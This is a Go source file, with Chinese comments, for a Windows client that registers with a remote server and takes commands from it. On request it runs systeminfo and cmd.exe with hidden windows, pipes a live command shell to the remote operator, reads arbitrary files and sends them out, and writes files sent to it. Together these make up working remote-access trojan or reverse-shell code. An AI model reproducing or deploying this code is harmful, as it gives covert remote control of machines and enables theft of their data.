package tcenter

import (
	"net"
	"crypto/md5"
	"encoding/hex"
	"os/exec"
	"syscall"
	"golang.org/x/sys/windows"
	"bytes"
	"time"
	"io"
	"encoding/json"
	"os"
	"io/ioutil"
)

type WSServer struct {
	BaseCenter
	ClientID string
}

type ShellServer struct {
	BaseCenter
}

// WSServer
func (d *WSServer) getLoaclMac() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		if (inter.Flags & net.FlagUp) == net.FlagUp {
			if (inter.Flags & net.FlagLoopback) != net.FlagLoopback {
				//fmt.Printf("MAC = %s(%s)\r\n", mac, inter.Name)
				return string(mac)
			}
		}
	}

	return ""
}

func (d *WSServer) getClientId() string {
	clientId := d.getLoaclMac()
	h := md5.New()
	h.Write([]byte(clientId))
	cipherStr := h.Sum(nil)
	return hex.EncodeToString(cipherStr)
}

// get system info
func (d *WSServer) getSystemInfo() string {
	cmdShell := exec.Command("systeminfo.exe", "/fo", "csv")
	cmdShell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
		CreationFlags: windows.STARTF_USESTDHANDLES,
	}

	var out bytes.Buffer
	cmdShell.Stdout = &out
	err := cmdShell.Run()
	if err != nil {
		d.log.Fatal(err)
		return ""
	}
	return out.String()
}

func (d *WSServer) Bind(groupID string)  {
	d.ClientID = d.getClientId()
	bindMessage := &headMessage{
		Type:		102,
		Target:		d.ClientID,
	}

	//d.log.Debug("bind", d.ClientID, "on", groupID)
	d.SendMessage(bindMessage, []byte(groupID))
}

func (d *WSServer) Listen() error {
	for {
		message, data, err := d.RecvMessage()
		if err != nil {
			return err
		}
		//d.log.Debug("recv message")

		go func() {
			if message.Type == 103 {
				if string(data) == "shell" {
					// new shell server
					shellServer := &ShellServer{}
					shellServer.TLSClientConfig = cloneTLSConfig(d.TLSClientConfig)
					err := shellServer.Dial(d.connectAddress)
					if err != nil {
						d.log.Debug(err.Error())
						return
					}

					shellServer.TargetUID = message.Sender
					err = shellServer.createShell()
					if err != nil {
						message := &headMessage{
							Type:	101,
							Target: shellServer.TargetUID,
						}
						shellServer.SendMessage(message, []byte(err.Error()))
					}

					d.log.Debug("shell end")
				}

			} else if message.Type == 105 {
				// get system info
				//d.log.Debug("get system info")
				systeminfo := d.getSystemInfo()

				message := &headMessage{
					Type:	105,
					Sender: d.ClientID,		// 这里需要修改ID为主机固定ID
					Target: message.Sender,
				}
				d.SendMessage(message, []byte(systeminfo))
			} else {
				d.log.Debug("unkown type", message.Type)
			}
		}()
	}

	return nil
}


// shell server
func (d *ShellServer) createShell() error {
	// create shell
	//d.log.Debug("create shell")
	cmdShell := exec.Command("cmd.exe")
	cmdShell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
		CreationFlags: windows.STARTF_USESTDHANDLES,
	}

	// get out pipe
	ppReader, err := cmdShell.StdoutPipe()
	defer ppReader.Close()
	if err != nil {
		return err
	}

	// get in pipe
	ppWriter, err := cmdShell.StdinPipe()
	defer ppWriter.Close()
	if err != nil {
		return err
	}

	// start shell
	if err := cmdShell.Start(); err != nil {
		return err
	}

	// send up message
	upMessage := &headMessage{
		Type:	101,
		Target: d.TargetUID,
	}
	d.SendMessage(upMessage, []byte(DefaultVersion))

	// pipeReader
	go func() {
		buffer := make([]byte, 10240)

		for {
			// 从管道读取数据
			n, err := ppReader.Read(buffer)
			if err != nil {
				if err == io.EOF {
					//d.log.Debug("pipi has closed")
					break
				} else {
					//d.log.Debug("read content failed")
					break
				}
			}

			// 发送数据
			shellMessage := &headMessage{
				Type:	201,
				Target: d.TargetUID,
			}

			d.SendMessage(shellMessage, buffer[:n])
		}
	}()

	// pipeWriter
	go func() {
		for {
			head, data, err := d.RecvBinMessage()
			if err != nil {
				return
			}

			message := &headMessage{}
			err = json.Unmarshal(head, message)
			if err != nil {
				return
			} else if message.Type == 201 {
				// 写入管道
				ppWriter.Write(data)
			} else if message.Type == 202 {
				fileInfo := &fileMessage{}
				json.Unmarshal(head, fileInfo)

				fileData, err := ioutil.ReadFile(fileInfo.Filename)
				if err != nil {
					shellMessage := &headMessage{
						Type:	201,
						Target: d.TargetUID,
					}
					d.SendMessage(shellMessage, []byte("get [" + fileInfo.Filename + "] " + err.Error()))
					continue
				}

				// 文件消息
				message := &fileMessage{
					Type:		203,
					Target: 	d.TargetUID,
					Filename: 	fileInfo.Filename,
				}
				d.sendFileMessage(message, fileData)
			} else if message.Type == 203 {
				fileInfo := &fileMessage{}
				json.Unmarshal(head, fileInfo)

				file, err := os.OpenFile(fileInfo.Filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0666)
				if err != nil {
					return
				}
				_, err = file.Write(data)
				file.Close()

				// 发送数据
				shellMessage := &headMessage{
					Type:	201,
					Target: d.TargetUID,
				}

				if err != nil {
					d.SendMessage(shellMessage, []byte("save [" + fileInfo.Filename + "] " + err.Error()))
				} else {
					d.SendMessage(shellMessage, []byte("save [" + fileInfo.Filename + "] ok"))
				}
			}
		}
	}()

	// wait 6 hour
	time.Sleep(time.Duration(6)*time.Hour)
	return nil
}